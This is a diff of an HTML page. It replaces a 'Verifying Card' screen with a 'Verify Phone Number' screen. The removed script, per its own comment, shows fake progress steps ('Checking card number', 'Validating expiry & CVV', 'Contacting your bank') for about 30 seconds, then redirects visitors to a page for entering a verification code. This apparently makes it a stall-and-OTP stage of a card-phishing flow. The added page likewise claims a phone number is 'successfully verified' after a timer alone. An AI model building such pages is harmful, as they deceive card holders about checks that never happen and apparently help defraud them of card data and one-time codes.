@@ -3,29 +3,84 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifying Card</title>
+
+<title>Verify Phone Number</title>
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
 
 body {
   font-family: 'Outfit', system-ui, sans-serif;
-  background: #05050a;
   min-height: 100vh;
-  color: #f0f0f5;
+  color: #f8f7ff;
+  background: #07070d;
+  overflow: hidden;
 }
 
-.bg {
+/* ---------- Background ---------- */
+
+.background {
   position: fixed;
   inset: 0;
-  z-index: 0;
+  overflow: hidden;
   background:
-    radial-gradient(ellipse at 30% 20%, rgba(124, 58, 237, 0.22) 0%, transparent 50%),
-    radial-gradient(ellipse at 70% 80%, rgba(219, 39, 119, 0.18) 0%, transparent 45%),
-    #05050a;
+    radial-gradient(
+      circle at 15% 15%,
+      rgba(99, 91, 255, 0.28),
+      transparent 34%
+    ),
+    radial-gradient(
+      circle at 85% 80%,
+      rgba(168, 85, 247, 0.24),
+      transparent 35%
+    ),
+    #07070d;
 }
+
+.orb {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(90px);
+  opacity: .45;
+  animation: drift 14s ease-in-out infinite alternate;
+}
+
+.orb.one {
+  width: 320px;
+  height: 320px;
+  background: #635bff;
+  top: -130px;
+  left: -100px;
+}
+
+.orb.two {
+  width: 280px;
+  height: 280px;
+  background: #c026d3;
+  right: -100px;
+  bottom: -80px;
+  animation-delay: -5s;
+}
+
+@keyframes drift {
+  from {
+    transform: translate(0, 0) scale(1);
+  }
+
+  to {
+    transform: translate(35px, -25px) scale(1.08);
+  }
+}
+
+/* ---------- Layout ---------- */
 
 .page {
   position: relative;
@@ -34,175 +89,435 @@ body {
   display: flex;
   align-items: center;
   justify-content: center;
-  padding: 32px 20px;
+  padding: 24px;
 }
+
+/* ---------- Glass Card ---------- */
 
 .card {
+  position: relative;
   width: 100%;
-  max-width: 400px;
-  background: rgba(18, 18, 28, 0.8);
-  backdrop-filter: blur(24px);
-  -webkit-backdrop-filter: blur(24px);
-  border: 1px solid rgba(255, 255, 255, 0.08);
-  border-radius: 24px;
-  padding: 48px 28px 40px;
-  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45);
+  max-width: 430px;
+  padding: 38px 30px 30px;
+
+  background: rgba(255, 255, 255, 0.075);
+  border: 1px solid rgba(255, 255, 255, 0.14);
+  border-radius: 28px;
+
+  backdrop-filter: blur(30px);
+  -webkit-backdrop-filter: blur(30px);
+
+  box-shadow:
+    0 30px 90px rgba(0, 0, 0, .55),
+    inset 0 1px 0 rgba(255, 255, 255, .08);
+
   text-align: center;
+  overflow: hidden;
 }
 
-/* Spinner */
-.spinner {
-  width: 56px;
-  height: 56px;
+.card::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  pointer-events: none;
+
+  background:
+    linear-gradient(
+      135deg,
+      rgba(255,255,255,.08),
+      transparent 35%,
+      transparent 70%,
+      rgba(167,139,250,.05)
+    );
+}
+
+/* ---------- Icon ---------- */
+
+.icon-wrap {
+  position: relative;
+  width: 82px;
+  height: 82px;
   margin: 0 auto 24px;
-  border: 3px solid rgba(167, 139, 250, 0.2);
-  border-top-color: #a78bfa;
-  border-radius: 50%;
-  animation: spin 0.85s linear infinite;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-h1 {
-  font-size: 1.3rem;
-  font-weight: 600;
-  margin-bottom: 10px;
-}
-
-.sub {
-  font-size: 0.92rem;
-  color: #9a9ab0;
-  line-height: 1.5;
-  margin-bottom: 28px;
-}
-
-/* Progress steps */
-.steps {
-  text-align: left;
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-}
-
-.step {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  font-size: 0.88rem;
-  color: #6b6b80;
-  padding: 10px 12px;
-  border-radius: 10px;
-  background: rgba(255, 255, 255, 0.03);
-  border: 1px solid rgba(255, 255, 255, 0.05);
-  transition: color 0.3s, border-color 0.3s, background 0.3s;
-}
-
-.step.active {
-  color: #e0e0f0;
-  border-color: rgba(167, 139, 250, 0.3);
-  background: rgba(167, 139, 250, 0.08);
-}
-
-.step.done {
-  color: #86efac;
-  border-color: rgba(34, 197, 94, 0.25);
-  background: rgba(34, 197, 94, 0.08);
-}
-
-.step-icon {
-  width: 22px;
-  height: 22px;
-  border-radius: 50%;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 0.7rem;
-  flex-shrink: 0;
-  background: rgba(255, 255, 255, 0.06);
 }
 
-.step.active .step-icon {
-  background: rgba(167, 139, 250, 0.3);
+.icon-glow {
+  position: absolute;
+  inset: 0;
+  border-radius: 50%;
+  background: rgba(124, 92, 255, .22);
+  filter: blur(14px);
+  animation: glow 2s ease-in-out infinite;
 }
 
-.step.done .step-icon {
-  background: rgba(34, 197, 94, 0.25);
+@keyframes glow {
+  0%, 100% {
+    transform: scale(.9);
+    opacity: .5;
+  }
+
+  50% {
+    transform: scale(1.12);
+    opacity: 1;
+  }
 }
 
-.note {
-  margin-top: 24px;
-  font-size: 0.78rem;
-  color: #6b6b80;
+.phone-icon {
+  position: relative;
+  z-index: 1;
+
+  width: 64px;
+  height: 64px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  border-radius: 21px;
+
+  background:
+    linear-gradient(
+      145deg,
+      rgba(124, 92, 255, .95),
+      rgba(168, 85, 247, .9)
+    );
+
+  box-shadow:
+    0 15px 35px rgba(99, 91, 255, .35),
+    inset 0 1px 1px rgba(255,255,255,.35);
+
+  font-size: 28px;
+}
+
+/* ---------- Text ---------- */
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 7px;
+
+  padding: 6px 11px;
+  margin-bottom: 14px;
+
+  border-radius: 999px;
+
+  color: #c4b5fd;
+  background: rgba(124, 92, 255, .1);
+  border: 1px solid rgba(167, 139, 250, .18);
+
+  font-size: .72rem;
+  font-weight: 600;
+  letter-spacing: .06em;
+  text-transform: uppercase;
+}
+
+.badge-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: #a78bfa;
+  box-shadow: 0 0 10px #a78bfa;
+}
+
+h1 {
+  position: relative;
+  font-size: 1.55rem;
+  font-weight: 600;
+  letter-spacing: -.02em;
+  margin-bottom: 9px;
+}
+
+.sub {
+  position: relative;
+  max-width: 330px;
+  margin: 0 auto;
+  color: #a4a3b5;
+  font-size: .9rem;
+  line-height: 1.55;
+}
+
+/* ---------- Verification Box ---------- */
+
+.verify-box {
+  position: relative;
+  margin-top: 27px;
+  padding: 18px;
+
+  border-radius: 18px;
+
+  background: rgba(0, 0, 0, .16);
+  border: 1px solid rgba(255, 255, 255, .08);
+
+  text-align: left;
+}
+
+.verify-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 13px;
+
+  color: #d8d6e8;
+  font-size: .82rem;
+  font-weight: 500;
+}
+
+.timer {
+  color: #a78bfa;
+  font-weight: 600;
+  font-variant-numeric: tabular-nums;
+}
+
+/* ---------- Progress ---------- */
+
+.progress {
+  width: 100%;
+  height: 7px;
+
+  overflow: hidden;
+  border-radius: 999px;
+
+  background: rgba(255,255,255,.07);
+}
+
+.progress-bar {
+  width: 0%;
+  height: 100%;
+
+  border-radius: inherit;
+
+  background:
+    linear-gradient(
+      90deg,
+      #635bff,
+      #a855f7,
+      #d946ef
+    );
+
+  box-shadow:
+    0 0 18px rgba(168,85,247,.55);
+
+  transition: width .1s linear;
+}
+
+/* ---------- Status ---------- */
+
+.status {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+
+  margin-top: 15px;
+
+  color: #9e9daf;
+  font-size: .82rem;
+}
+
+.status-icon {
+  width: 22px;
+  height: 22px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  border-radius: 50%;
+
+  background: rgba(124,92,255,.12);
+  color: #a78bfa;
+  font-size: .72rem;
+}
+
+/* ---------- Footer ---------- */
+
+.footer {
+  position: relative;
+  margin-top: 22px;
+
+  color: #686778;
+  font-size: .72rem;
+  line-height: 1.5;
+}
+
+.footer strong {
+  color: #89879a;
+  font-weight: 500;
+}
+
+/* ---------- Complete State ---------- */
+
+.success .icon-glow {
+  background: rgba(34,197,94,.2);
+}
+
+.success .phone-icon {
+  background:
+    linear-gradient(
+      145deg,
+      #16a34a,
+      #22c55e
+    );
+
+  box-shadow:
+    0 15px 35px rgba(34,197,94,.25),
+    inset 0 1px 1px rgba(255,255,255,.3);
+}
+
+.success .badge {
+  color: #86efac;
+  background: rgba(34,197,94,.08);
+  border-color: rgba(34,197,94,.18);
+}
+
+.success .badge-dot {
+  background: #22c55e;
+  box-shadow: 0 0 10px #22c55e;
+}
+
+/* ---------- Responsive ---------- */
+
+@media (max-width: 480px) {
+  .page {
+    padding: 16px;
+  }
+
+  .card {
+    padding: 34px 22px 27px;
+    border-radius: 24px;
+  }
+
+  h1 {
+    font-size: 1.4rem;
+  }
 }
 </style>
 </head>
+
 <body>
 
-<div class="bg"></div>
+<div class="background">
+  <div class="orb one"></div>
+  <div class="orb two"></div>
+</div>
 
 <div class="page">
-  <div class="card">
-    <div class="spinner" id="spinner"></div>
-    <h1 id="title">Verifying card details</h1>
-    <p class="sub" id="sub">Please wait while we check your card with the issuer…</p>
 
-    <div class="steps">
-      <div class="step active" id="s1">
-        <span class="step-icon">1</span>
-        Checking card number
-      </div>
-      <div class="step" id="s2">
-        <span class="step-icon">2</span>
-        Validating expiry &amp; CVV
-      </div>
-      <div class="step" id="s3">
-        <span class="step-icon">3</span>
-        Contacting your bank
+  <main class="card" id="card">
+
+    <div class="icon-wrap">
+      <div class="icon-glow"></div>
+
+      <div class="phone-icon" id="phoneIcon">
+        ☎
       </div>
     </div>
 
-    <p class="note">Do not close this window</p>
-  </div>
+    <div class="badge">
+      <span class="badge-dot"></span>
+      Phone verification
+    </div>
+
+    <h1 id="title">Verifying your phone</h1>
+
+    <p class="sub" id="subtitle">
+      Please wait while we verify your phone number.
+    </p>
+
+    <div class="verify-box">
+
+      <div class="verify-header">
+        <span id="progressText">Verification in progress</span>
+        <span class="timer" id="timer">10s</span>
+      </div>
+
+      <div class="progress">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="status">
+        <span class="status-icon" id="statusIcon">✓</span>
+        <span id="statusText">
+          Checking verification status…
+        </span>
+      </div>
+
+    </div>
+
+    <p class="footer">
+      <strong>Please keep this window open.</strong><br>
+      Verification will finish automatically.
+    </p>
+
+  </main>
+
 </div>
 
 <script>
-  // Fake verification progress, then go to code page
-  // Total wait ~30 seconds before going to code page
-  const steps = [
-    { id: 's1', delay: 8000 },
-    { id: 's2', delay: 16000 },
-    { id: 's3', delay: 24000 }
-  ];
+const duration = 10000;
+const start = Date.now();
 
-  steps.forEach((s, i) => {
-    setTimeout(() => {
-      if (i > 0) {
-        const prev = document.getElementById(steps[i - 1].id);
-        prev.classList.remove('active');
-        prev.classList.add('done');
-        prev.querySelector('.step-icon').textContent = '✓';
-      }
-      document.getElementById(s.id).classList.add('active');
-    }, s.delay);
-  });
+const timer = document.getElementById("timer");
+const progressBar = document.getElementById("progressBar");
+const statusText = document.getElementById("statusText");
+const progressText = document.getElementById("progressText");
 
-  // Finish at 30s → redirect to verification code page
-  setTimeout(() => {
-    const last = document.getElementById('s3');
-    last.classList.remove('active');
-    last.classList.add('done');
-    last.querySelector('.step-icon').textContent = '✓';
+const title = document.getElementById("title");
+const subtitle = document.getElementById("subtitle");
+const card = document.getElementById("card");
+const phoneIcon = document.getElementById("phoneIcon");
 
-    document.getElementById('title').textContent = 'Card verified';
-    document.getElementById('sub').textContent = 'Redirecting to enter your verification code…';
-    document.getElementById('spinner').style.borderTopColor = '#86efac';
+function updateVerification() {
+  const elapsed = Date.now() - start;
+  const remaining = Math.max(0, duration - elapsed);
 
-    setTimeout(() => {
-      window.location.href = '/verify.html';
-    }, 1500);
-  }, 30000);
+  const percentage = Math.min(
+    100,
+    (elapsed / duration) * 100
+  );
+
+  progressBar.style.width = percentage + "%";
+
+  const seconds = Math.ceil(remaining / 1000);
+  timer.textContent = seconds + "s";
+
+  if (percentage < 35) {
+    statusText.textContent = "Checking verification status…";
+  } else if (percentage < 70) {
+    statusText.textContent = "Confirming your phone number…";
+  } else {
+    statusText.textContent = "Finishing verification…";
+  }
+
+  if (remaining <= 0) {
+    finishVerification();
+    return;
+  }
+
+  requestAnimationFrame(updateVerification);
+}
+
+function finishVerification() {
+  progressBar.style.width = "100%";
+  timer.textContent = "✓";
+
+  progressText.textContent = "Verification complete";
+  statusText.textContent = "Phone number verified";
+
+  title.textContent = "Phone verified";
+  subtitle.textContent = "Your phone number has been successfully verified.";
+
+  phoneIcon.textContent = "✓";
+  card.classList.add("success");
+
+  /*
+    Optional redirect:
+    window.location.href = "/success.html";
+  */
+}
+
+requestAnimationFrame(updateVerification);
 </script>
 
 </body>
